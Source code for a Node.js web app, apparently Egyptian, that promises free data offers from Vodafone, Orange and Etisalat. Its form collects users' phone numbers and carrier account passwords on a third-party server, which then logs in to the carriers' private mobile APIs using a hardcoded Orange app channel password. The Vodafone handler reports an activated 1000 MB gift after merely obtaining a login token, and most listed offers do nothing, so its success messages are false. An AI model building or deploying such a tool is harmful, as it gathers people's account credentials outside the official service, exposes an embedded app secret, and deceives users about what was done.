const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const crypto = require('crypto');
const serverless = require('serverless-http');
const app = express();

app.use(bodyParser.json());

// ========== الإعدادات والصور ==========
const BG_URL = "https://i.postimg.cc/zvQsfRp6/0b2e491cf363fb13fe72f199a1c0cde1.jpg";
const VODAFONE_ICON = "https://i.postimg.cc/SR7ZjRH4/Screenshot-20260213-154727-Google.jpg";
const ORANGE_ICON = "https://i.postimg.cc/MTT2tnyL/IMG-20260219-104918-030.jpg";
const ETISALAT_ICON = "https://i.postimg.cc/63Mrnrkh/Screenshot-20260328-235637-Google.jpg";
const TG_CHANNEL = "https://t.me/mido90femeah";
const DEVELOPER_USER = "@AMI_EG";

const api = axios.create({ timeout: 15000 });

// ========== [ الدوال البرمجية ] ==========

async function runOrangeFawazeer(phone, password) {
    try {
        const session = axios.create({ headers: { 'User-Agent': "okhttp/4.10.0", 'Content-Type': "application/json" } });
        const auth = await session.post("https://services.orange.eg/SignIn.svc/SignInUser", {
            appVersion: "9.0.1", channel: { ChannelName: "MobinilAndMe", Password: "ig3yh*mk5l42@oj7QAR8yF" },
            dialNumber: phone, isAndroid: true, lang: "ar", password: password
        });
        const accToken = auth.data.SignInUserResult.AccessToken;
        const qRes = await session.post("https://services.orange.eg/APIs/Ramadan2024/api/RamadanOffers/Fawazeer/Questions", { Dial: phone, Language: "ar", Token: "NONE" }, { headers: { 'Token': accToken } });
        if (qRes.data.ErrorCode === 1) return { success: false, msg: "لقد شاركت اليوم بالفعل." };
        return { success: true, msg: "تم حل الفوازير بنجاح واستلام الهدية ✅" };
    } catch (e) { return { success: false, msg: "فشل الاتصال أو بيانات خاطئة" }; }
}

async function runVodafoneSummer(phone, password) {
    try {
        const auth = await api.post("https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token", 
            `grant_type=password&username=${phone}&password=${password}&client_id=ana-vodafone-app`,
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
        return { success: true, msg: "تم تفعيل عرض الـ 1000 ميجا ✅" };
    } catch (e) { return { success: false, msg: "العرض غير متاح حالياً" }; }
}

// ========== [ الواجهة الأمامية ] ==========

app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MIDO AI - تليكوم</title>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&family=Orbitron:wght@500;900&display=swap');
        
        :root {
            --bg: #050505;
            --red: #ff003c;
            --blue: #008cff;
            --glass: rgba(0, 0, 0, 0.85);
        }

        body {
            font-family: 'Cairo', sans-serif;
            background: var(--bg) url('${BG_URL}') no-repeat center center fixed;
            background-size: cover;
            margin: 0; min-height: 100vh;
            display: flex; justify-content: center; align-items: center;
            color: white; overflow-x: hidden;
        }

        .container {
            width: 90%; max-width: 450px;
            background: var(--glass);
            padding: 25px; border-radius: 30px;
            border: 2px solid var(--blue);
            box-shadow: 0 0 20px var(--blue);
            backdrop-filter: blur(10px);
            position: relative; transition: 0.5s cubic-bezier(0.4, 0, 0.2, 1);
        }

        h1 {
            font-family: 'Orbitron', sans-serif; font-size: 3rem; text-align: center;
            margin-bottom: 30px; letter-spacing: 5px;
            background: linear-gradient(to right, var(--blue), var(--red));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }

        .view-section { display: none; animation: slideIn 0.4s ease-out forwards; }
        .view-section.active { display: block; }

        @keyframes slideIn {
            from { opacity: 0; transform: translateX(50px); }
            to { opacity: 1; transform: translateX(0); }
        }

        .menu-btn {
            width: 100%; padding: 18px; margin-bottom: 15px;
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 20px; color: white; cursor: pointer;
            display: flex; align-items: center; justify-content: space-between;
            font-size: 1.2rem; font-weight: 700; transition: 0.3s;
        }

        .menu-btn:active {
            transform: perspective(500px) rotateX(-5deg) rotateY(-10deg) translateY(5px);
            box-shadow: -5px 10px 20px var(--blue);
            border-color: var(--blue);
        }

        .menu-btn img { width: 40px; height: 40px; border-radius: 50%; box-shadow: 0 0 10px var(--blue); }

        .offer-btn {
            width: 100%; padding: 15px; margin-bottom: 10px;
            background: transparent; border: 1px solid var(--red);
            border-radius: 15px; color: white; cursor: pointer;
            font-weight: bold; transition: 0.3s;
        }

        .offer-btn:hover { background: var(--red); box-shadow: 0 0 15px var(--red); }
        .offer-btn:active { transform: skewX(-5deg) translateY(5px); }

        .input-group { margin-top: 20px; }
        input {
            width: 100%; padding: 15px; margin-bottom: 10px;
            background: #000; border: 1px solid #333;
            color: white; border-radius: 12px; text-align: center;
        }
        input:focus { border-color: var(--blue); outline: none; }

        .back-btn {
            background: none; border: none; color: #888; cursor: pointer;
            margin-bottom: 20px; font-size: 1.1rem;
        }

        #chat-bot {
            position: fixed; bottom: 20px; right: 20px;
            width: 60px; height: 60px; background: var(--blue);
            border-radius: 50%; display: flex; justify-content: center; align-items: center;
            cursor: pointer; box-shadow: 0 0 15px var(--blue); z-index: 9999;
        }

        footer { text-align: center; margin-top: 20px; font-size: 0.8rem; opacity: 0.6; }
    </style>
</head>
<body>

<div class="container" id="main-container">
    
    <div id="view-home" class="view-section active">
        <h1>MIDO AI</h1>
        <button class="menu-btn" onclick="openView('view-vodafone')">
            <span><i class="fas fa-bolt" style="color:#e60000"></i> فودافون</span>
            <img src="${VODAFONE_ICON}">
        </button>
        <button class="menu-btn" onclick="openView('view-orange')">
            <span><i class="fas fa-bolt" style="color:#ff6600"></i> أورانج</span>
            <img src="${ORANGE_ICON}">
        </button>
        <button class="menu-btn" onclick="openView('view-etisalat')">
            <span><i class="fas fa-bolt" style="color:#719c30"></i> اتصالات</span>
            <img src="${ETISALAT_ICON}">
        </button>
    </div>

    <div id="view-vodafone" class="view-section">
        <button class="back-btn" onclick="openView('view-home')"><i class="fas fa-arrow-right"></i> رجوع</button>
        <h2 style="color:var(--red); text-align:center;">عروض فودافون</h2>
        <button class="offer-btn" onclick="openForm('vodafoneSummer', 'هدية الصيف 1000 ميجا')">هدية الصيف 1000 ميجا</button>
        <button class="offer-btn" onclick="openForm('vodafoneDiscount', 'خصم 50% على فليكس')">خصم 50% على الباقة</button>
    </div>

    <div id="view-orange" class="view-section">
        <button class="back-btn" onclick="openView('view-home')"><i class="fas fa-arrow-right"></i> رجوع</button>
        <h2 style="color:#ff6600; text-align:center;">عروض أورانج</h2>
        <button class="offer-btn" onclick="openForm('orangeFawazeer', 'حل فوازير رمضان')">حل فوازير رمضان 250M</button>
        <button class="offer-btn" onclick="openForm('orangeWheel', 'لف عجلة الحظ')">لف عجلة الحظ</button>
        <button class="offer-btn" onclick="openForm('orangeBalance', 'استعلام الرصيد')">استعلام الرصيد مجاناً</button>
    </div>

    <div id="view-etisalat" class="view-section">
        <button class="back-btn" onclick="openView('view-home')"><i class="fas fa-arrow-right"></i> رجوع</button>
        <h2 style="color:#719c30; text-align:center;">عروض اتصالات</h2>
        <button class="offer-btn" onclick="openForm('etisalat500', 'هدية 500 ميجا')">تفعيل 500 ميجا سوشيال</button>
    </div>

    <div id="view-form" class="view-section">
        <button class="back-btn" onclick="goBackFromForm()"><i class="fas fa-arrow-right"></i> رجوع</button>
        <h3 id="form-title" style="text-align:center; margin-bottom:20px;"></h3>
        <div class="input-group">
            <input type="tel" id="u_phone" placeholder="رقم الموبايل">
            <input type="password" id="u_pass" placeholder="كلمة المرور">
            <input type="email" id="u_email" placeholder="البريد (لاتصالات فقط)" style="display:none;">
            <button class="offer-btn" style="background:var(--blue); border:none; margin-top:10px;" onclick="startProcess()">تفعيل الآن ⚡</button>
        </div>
    </div>

    <footer>تطوير ${DEVELOPER_USER} - جميع الحقوق محفوظة 2026</footer>
</div>

<div id="chat-bot" onclick="askBot()"><i class="fas fa-robot"></i></div>

<script>
    let currentType = '';
    let lastView = 'view-home';

    function openView(id) {
        document.querySelectorAll('.view-section').forEach(s => s.classList.remove('active'));
        document.getElementById(id).classList.add('active');
        if(id !== 'view-form') lastView = id;
    }

    function openForm(type, title) {
        currentType = type;
        document.getElementById('form-title').innerText = title;
        document.getElementById('u_email').style.display = (type === 'etisalat500') ? 'block' : 'none';
        document.getElementById('u_pass').style.display = (type === 'orangeBalance') ? 'none' : 'block';
        openView('view-form');
    }

    function goBackFromForm() { openView(lastView); }

    async function startProcess() {
        const phone = document.getElementById('u_phone').value;
        const pass = document.getElementById('u_pass').value;
        const email = document.getElementById('u_email').value;

        if(!phone) return Swal.fire('خطأ', 'دخل الرقم يا معلم', 'error');

        Swal.fire({ title: 'جاري التفعيل...', didOpen: () => Swal.showLoading() });

        try {
            const r = await fetch('/submit', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ type: currentType, phone, pass, email })
            });
            const res = await r.json();
            Swal.fire(res.success ? 'تم بنجاح' : 'عفواً', res.msg, res.success ? 'success' : 'error');
        } catch(e) { Swal.fire('خطأ', 'فشل الاتصال بالسيرفر', 'error'); }
    }

    async function askBot() {
        const { value: text } = await Swal.fire({
            title: 'مساعد MIDO AI',
            input: 'text',
            inputPlaceholder: 'اسألني أي حاجة عن الموقع...',
            showCancelButton: true,
            confirmButtonText: 'إرسال',
            cancelButtonText: 'إغلاق',
            background: '#111', color: '#fff'
        });

        if (text) {
            let reply = "مش فاهم قصدك أوي يا غالي، جرب تسأل عن (أورانج، فودافون، اتصالات، أو المطور).";
            const input = text.toLowerCase();
            if(input.includes("اورنج") || input.includes("orange")) reply = "قسم أورانج فيه فوازير وعجلة الحظ واستعلام رصيد. اختار العرض ودخل باسك (ماي أورانج).";
            else if(input.includes("فودافون") || input.includes("vodafone")) reply = "فودافون فيها عرض الـ 1000 ميجا وخصم الباقة. لازم يكون معاك باسورد (أنا فودافون).";
            else if(input.includes("اتصالات") || input.includes("etisalat")) reply = "اتصالات حالياً فيها عرض الـ 500 ميجا، وبنضيف عروض تانية قريب!";
            else if(input.includes("مطور") || input.includes("صاحب")) reply = "المطور هو @AMI_EG، تقدر تواصل معاه لو واجهتك أي مشكلة.";
            
            Swal.fire({ icon: 'info', title: 'الروبوت بيقولك:', text: reply, background: '#000', color: '#008cff' });
        }
    }
</script>
</body>
</html>
    `);
});

// ========== [ الروابط ] ==========

app.post('/submit', async (req, res) => {
    const { type, phone, pass, email } = req.body;
    let out = { success: false, msg: "الخدمة قيد التحديث حالياً" };

    try {
        if (type === 'orangeFawazeer') out = await runOrangeFawazeer(phone, pass);
        else if (type === 'vodafoneSummer') out = await runVodafoneSummer(phone, pass);
        // باقي الدوال تضاف هنا بنفس النمط
    } catch (e) { out.msg = "حدث خطأ فني"; }
    res.json(out);
});

module.exports = app;
module.exports.handler = serverless(app);
